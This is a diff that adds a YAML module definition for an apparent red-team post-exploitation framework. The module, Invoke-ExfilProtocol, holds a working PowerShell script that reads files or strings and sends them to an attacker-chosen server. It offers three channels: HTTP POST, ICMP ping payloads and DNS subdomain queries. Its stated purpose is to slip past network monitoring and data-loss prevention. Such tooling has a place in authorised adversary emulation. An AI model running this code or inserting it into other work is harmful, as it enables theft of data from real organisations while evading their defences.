@@ -1,0 +1,154 @@
+name: Invoke-ExfilProtocol
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Exfiltrate data via alternative protocols including HTTP POST, ICMP,
+  or DNS. Adversaries use non-standard protocols to bypass network
+  monitoring and DLP solutions. HTTP POST sends data directly to a
+  remote server. ICMP exfiltration embeds data in ping packets, which
+  may not be inspected by firewalls. DNS exfiltration encodes data as
+  subdomain labels in DNS queries. Each method has different bandwidth
+  and stealth tradeoffs.
+software: ''
+tactics: [TA0010]
+techniques: [T1048.003]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Method
+    description: >-
+      Exfiltration protocol to use. http sends via POST, icmp embeds in ping packets,
+      dns encodes as subdomains.
+    required: true
+    value: 'http'
+    strict: true
+    suggested_values:
+      - http
+      - icmp
+      - dns
+  - name: SourceType
+    description: >-
+      Whether the payload to exfiltrate is a literal string or a file on disk.
+    required: true
+    value: 'string'
+    strict: true
+    suggested_values:
+      - string
+      - file
+  - name: Data
+    description: Literal string to exfiltrate.
+    required: true
+    depends_on:
+      - name: SourceType
+        values: ['string']
+    value: ''
+  - name: FilePath
+    description: Path to a file whose contents should be exfiltrated.
+    required: true
+    depends_on:
+      - name: SourceType
+        values: ['file']
+    value: ''
+  - name: Destination
+    description: >-
+      Destination server. For http use a full URL (http://ip:port). For icmp use
+      an IP. For dns use a domain (data.example.com).
+    required: true
+    value: ''
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-ExfilProtocol {
+      param(
+          [string]$Method,
+          [string]$SourceType,
+          [string]$Data,
+          [string]$FilePath,
+          [string]$Destination
+      )
+
+      if ($SourceType -eq 'file') {
+          $FilePath = $ExecutionContext.InvokeCommand.ExpandString($FilePath)
+          if (-not (Test-Path $FilePath)) {
+              Write-Output "[-] File not found: $FilePath"
+              return
+          }
+          Write-Output "[*] Reading file: $FilePath"
+          $content = [System.IO.File]::ReadAllBytes($FilePath)
+      }
+      else {
+          $content = [System.Text.Encoding]::UTF8.GetBytes($Data)
+      }
+
+      Write-Output "[*] Exfiltrating $($content.Length) bytes via $Method to $Destination"
+
+      switch ($Method) {
+          "http" {
+              try {
+                  $encoded = [System.Convert]::ToBase64String($content)
+                  Invoke-WebRequest -Uri $Destination -Method POST `
+                      -Body $encoded -UseBasicParsing
+                  Write-Output "[+] HTTP POST exfiltration completed."
+              }
+              catch {
+                  Write-Output "[-] HTTP exfiltration failed: $($_.Exception.Message)"
+              }
+          }
+          "icmp" {
+              try {
+                  $ping = New-Object System.Net.NetworkInformation.Ping
+                  $chunkSize = 1024
+                  $total = [math]::Ceiling($content.Length / $chunkSize)
+                  $success = 0; $fail = 0
+                  for ($i = 0; $i -lt $content.Length; $i += $chunkSize) {
+                      $end = [math]::Min($i + $chunkSize, $content.Length)
+                      $chunk = $content[$i..($end - 1)]
+                      $reply = $ping.Send($Destination, 1500, $chunk)
+                      if ($reply.Status -eq 'Success') { $success++ } else { $fail++ }
+                  }
+                  Write-Output "[+] ICMP exfiltration: $success/$total chunks sent, $fail failed."
+              }
+              catch {
+                  Write-Output "[-] ICMP exfiltration failed: $($_.Exception.Message)"
+              }
+          }
+          "dns" {
+              try {
+                  $hex = [System.BitConverter]::ToString($content) -replace '-', ''
+                  $chunkSize = 60
+                  $chunks = [math]::Ceiling($hex.Length / $chunkSize)
+                  $success = 0; $fail = 0
+                  for ($i = 0; $i -lt $hex.Length; $i += $chunkSize) {
+                      $end = [math]::Min($i + $chunkSize, $hex.Length)
+                      $label = $hex.Substring($i, $end - $i)
+                      $query = "$label.$Destination"
+                      try {
+                          Resolve-DnsName -Name $query -ErrorAction Stop | Out-Null
+                          $success++
+                      } catch { $fail++ }
+                  }
+                  Write-Output "[+] DNS exfiltration: $success/$chunks queries succeeded, $fail failed."
+              }
+              catch {
+                  Write-Output "[-] DNS exfiltration failed: $($_.Exception.Message)"
+              }
+          }
+          default {
+              Write-Output "[-] Unknown method: $Method"
+          }
+      }
+  }
+script_end: Invoke-ExfilProtocol {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
